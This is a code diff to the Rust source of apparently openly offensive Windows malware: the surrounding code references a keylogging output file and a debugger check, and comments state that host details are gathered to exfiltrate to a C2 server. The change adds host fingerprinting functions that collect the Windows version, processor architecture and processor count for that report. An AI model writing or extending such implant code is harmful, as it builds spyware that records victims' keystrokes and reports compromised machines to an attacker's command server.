@@ -7,6 +7,9 @@ use crate::encode::{EncodeFile};
 use std::path::{PathBuf};
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
 
+use windows::Wdk::System::SystemServices::RtlGetVersion;
+use windows::Win32::System::SystemInformation::OSVERSIONINFOW;
+
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
 };
@@ -68,24 +71,45 @@ static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
     path
 });
 
+pub fn get_windows_os_version() -> String{
+    unsafe {
+        let mut os_info: OSVERSIONINFOW = std::mem::zeroed();
+        os_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
+
+        if RtlGetVersion(&mut os_info).is_ok() {
+            format!(
+                "Windows {}.{}.{}",
+                os_info.dwMajorVersion,
+                os_info.dwMinorVersion,
+                os_info.dwBuildNumber
+            )
+        } else {
+            "Unknown Windows Version".to_string()
+        }
+    }
+}
+
 //function that finds the windows version of the host
 //this is used to exfiltrate to the c2 server, notifying
 //what type of cost this is
-pub fn get_windows_version() -> &'static str{
+pub fn get_architecture() -> String{
 
     //obtain the info it is
     let mut system_info = SYSTEM_INFO::default();
+
     unsafe {
+        //from the info, find the the architecture
         GetSystemInfo(&mut system_info);
-    };
+        let arch = system_info.Anonymous.Anonymous.wProcessorArchitecture;
+         //obtains what type of malware it is
+        let arch_string = get_system_arch(arch);
 
-    //from the info, find the the architecture
-    let arch = unsafe {
-        system_info.Anonymous.Anonymous.wProcessorArchitecture
-    };
+        //get number of processors
+        let num_proc = system_info.dwNumberOfProcessors;
 
-    //obtains what type of malware it is
-    get_system_arch(arch)
+        format!("Architecture: {} | Number Of Processors: {}", arch_string, num_proc)
+    }
+
 }
 
 //helper function, to convert process_arch enum to string
